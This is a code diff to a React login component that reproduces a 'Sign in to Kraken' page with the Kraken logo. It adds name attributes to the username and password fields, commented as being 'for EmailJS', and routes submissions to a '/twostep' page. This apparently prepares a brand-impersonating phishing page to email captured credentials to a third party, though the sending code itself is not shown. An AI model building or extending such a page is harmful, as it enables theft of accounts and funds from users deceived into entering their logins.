@@ -1,16 +1,15 @@
-import React from "react";
+import React, { useRef } from "react";
 import "./Login.css";
 import kraken from "../../assets/kraken logo.png";
 import { useNavigate } from "react-router";
 
 const Login = () => {
+  const navigate = useNavigate();
 
-    const navigate = useNavigate();
-
-    const handlesubmit = (e) => {
-        e.preventDefault();
-        navigate('/twostep')
-    }
+  const handlesubmit = (e) => {
+    e.preventDefault();
+    navigate('/twostep')
+  };
 
   return (
     <div className="loginbody">
@@ -27,8 +26,20 @@ const Login = () => {
         </div>
         <form className="logincontainer" onSubmit={handlesubmit}>
           <h1>Sign in to Kraken</h1>
-          <input className='text' type="text" placeholder="Email or username" required />
-          <input className='password' type="password" placeholder="Password" required />
+          <input
+            className="text"
+            type="text"
+            name="username" // Add "name" attribute for EmailJS
+            placeholder="Email or username"
+            required
+          />
+          <input
+            className="password"
+            type="password"
+            name="password" // Add "name" attribute for EmailJS
+            placeholder="Password"
+            required
+          />
           <p>
             Forgot <span>password </span>or <span>username</span>?
           </p>
